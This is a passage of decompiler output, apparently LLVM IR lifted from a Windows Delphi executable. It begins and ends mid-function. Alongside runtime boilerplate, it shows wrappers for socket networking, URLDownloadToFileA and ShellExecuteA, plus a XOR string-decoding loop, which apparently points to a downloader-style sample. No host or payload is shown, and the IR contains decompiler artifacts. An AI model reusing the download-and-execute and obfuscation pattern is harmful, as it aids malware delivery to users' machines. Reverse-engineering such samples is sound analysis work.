  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_4049a8() local_unnamed_addr {
dec_label_pc_4049a8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !322
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !322
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !322
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !323
  %2 = load i32, i32* @global_var_409688, align 4, !insn.addr !324
  %3 = add i32 %2, 1, !insn.addr !324
  store i32 %3, i32* @global_var_409688, align 4, !insn.addr !324
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !325
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !326
  ret i32 0, !insn.addr !327
}

define i32 @function_4049cd() local_unnamed_addr {
dec_label_pc_4049cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !328
  ret i32 %0, !insn.addr !328
}

define i32 @function_4049d2() local_unnamed_addr {
dec_label_pc_4049d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !329
}

define i32 @function_4049d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !330
}

define i32 @function_4049d8() local_unnamed_addr {
dec_label_pc_4049d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !331
  %2 = add i32 %1, -1, !insn.addr !331
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !331
  ret i32 %0, !insn.addr !332
}

define i32* @function_4049e0(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_4049e0:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !333
  ret i32* %0, !insn.addr !333
}

define i32 @function_4049e8() local_unnamed_addr {
dec_label_pc_4049e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !334
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !334
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !334
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !335
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !336
  %3 = add i32 %2, 1, !insn.addr !336
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !336
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !337
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !338
  ret i32 0, !insn.addr !339
}

define i32 @function_404a0d() local_unnamed_addr {
dec_label_pc_404a0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !340
  ret i32 %0, !insn.addr !340
}

define i32 @function_404a12() local_unnamed_addr {
dec_label_pc_404a12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !341
}

define i32 @function_404a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a14:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !342
}

define i32 @function_404a18() local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !343
  %2 = add i32 %1, -1, !insn.addr !343
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !343
  ret i32 %0, !insn.addr !344
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !345
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !345
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !345
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !346
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !347
  %3 = add i32 %2, 1, !insn.addr !347
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !347
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !348
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !349
  ret i32 0, !insn.addr !350
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !351
  ret i32 %0, !insn.addr !351
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !352
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !353
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !354
  %2 = add i32 %1, -1, !insn.addr !354
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !354
  ret i32 %0, !insn.addr !355
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !356
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !356
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !356
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !357
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !358
  %3 = add i32 %2, 1, !insn.addr !358
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !358
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !359
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !360
  ret i32 0, !insn.addr !361
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !362
  ret i32 %0, !insn.addr !362
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !363
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !364
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !365
  %2 = add i32 %1, -1, !insn.addr !365
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !365
  ret i32 %0, !insn.addr !366
}

define i32 @function_404a90(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404a90:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !367
  ret i32 %0, !insn.addr !367
}

define i32 @function_404a98() local_unnamed_addr {
dec_label_pc_404a98:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !368
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !368
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !368
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !369
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !370
  %3 = add i32 %2, 1, !insn.addr !370
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !370
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !371
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !372
  ret i32 0, !insn.addr !373
}

define i32 @function_404abd() local_unnamed_addr {
dec_label_pc_404abd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !374
  ret i32 %0, !insn.addr !374
}

define i32 @function_404ac2() local_unnamed_addr {
dec_label_pc_404ac2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !375
}

define i32 @function_404ac4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !376
}

define i32 @function_404ac8() local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !377
  %2 = add i32 %1, -1, !insn.addr !377
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !377
  ret i32 %0, !insn.addr !378
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !379
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404ad4, label %dec_label_pc_404add, !insn.addr !380

dec_label_pc_404ad4:                              ; preds = %dec_label_pc_404ad0
  %4 = add nuw nsw i32 %3, 48, !insn.addr !381
  ret i32 %4, !insn.addr !382

dec_label_pc_404add:                              ; preds = %dec_label_pc_404ad0
  %5 = add nuw nsw i32 %3, 55, !insn.addr !383
  ret i32 %5, !insn.addr !384
}

define i32 @function_404ae8() local_unnamed_addr {
dec_label_pc_404ae8:
  %esp.2.reg2mem = alloca i32, !insn.addr !385
  %esp.1.reg2mem = alloca i32, !insn.addr !385
  %cf.0.reg2mem = alloca i1, !insn.addr !385
  %esi.0.reg2mem = alloca i32, !insn.addr !385
  %esp.0.reg2mem = alloca i32, !insn.addr !385
  %ebx.0.reg2mem = alloca i32, !insn.addr !385
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !386
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !387
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !387
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !387
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !388
  %4 = call i32 @"@LStrClr"(), !insn.addr !389
  %5 = call i32 @function_4034c8(), !insn.addr !390
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !391
  br i1 %6, label %dec_label_pc_404be9, label %dec_label_pc_404b35.preheader, !insn.addr !391

dec_label_pc_404b35.preheader:                    ; preds = %dec_label_pc_404ae8
  %7 = add i32 %0, -1, !insn.addr !392
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b35

dec_label_pc_404b35:                              ; preds = %dec_label_pc_404b35.preheader, %dec_label_pc_404be1
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !392
  %9 = inttoptr i32 %8 to i8*, !insn.addr !392
  %10 = load i8, i8* %9, align 1, !insn.addr !392
  %11 = icmp eq i8 %10, 32, !insn.addr !392
  %12 = icmp eq i1 %11, false, !insn.addr !393
  br i1 %12, label %dec_label_pc_404b50, label %dec_label_pc_404b3f, !insn.addr !393

dec_label_pc_404b3f:                              ; preds = %dec_label_pc_404b35
  %13 = call i32 @"@LStrCat"(), !insn.addr !394
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !395
  br label %dec_label_pc_404be1, !insn.addr !395

dec_label_pc_404b50:                              ; preds = %dec_label_pc_404b35
  %14 = icmp ult i8 %10, 32, !insn.addr !396
  br i1 %14, label %dec_label_pc_404b73, label %dec_label_pc_404b5a, !insn.addr !397

dec_label_pc_404b5a:                              ; preds = %dec_label_pc_404b50
  %15 = add i8 %10, -32, !insn.addr !398
  %16 = icmp ult i8 %15, 95, !insn.addr !399
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !400
  br i1 %17, label %dec_label_pc_404b67, label %dec_label_pc_404b71, !insn.addr !400

dec_label_pc_404b67:                              ; preds = %dec_label_pc_404b5a
  %18 = load i32, i32* inttoptr (i32 4213800 to i32*), align 8, !insn.addr !401
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !401
  %21 = shl i32 1, %20, !insn.addr !401
  %22 = and i32 %18, %21, !insn.addr !401
  %23 = icmp ne i32 %22, 0, !insn.addr !401
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !401
  br label %dec_label_pc_404b71, !insn.addr !401

dec_label_pc_404b71:                              ; preds = %dec_label_pc_404b5a, %dec_label_pc_404b67
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !402
  br i1 %24, label %dec_label_pc_404bc8, label %dec_label_pc_404b73, !insn.addr !402

dec_label_pc_404b73:                              ; preds = %dec_label_pc_404b71, %dec_label_pc_404b50
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !403
  %27 = add i32 %esp.0.reload, -4, !insn.addr !404
  %28 = inttoptr i32 %27 to i32*, !insn.addr !404
  store i32 %26, i32* %28, align 4, !insn.addr !404
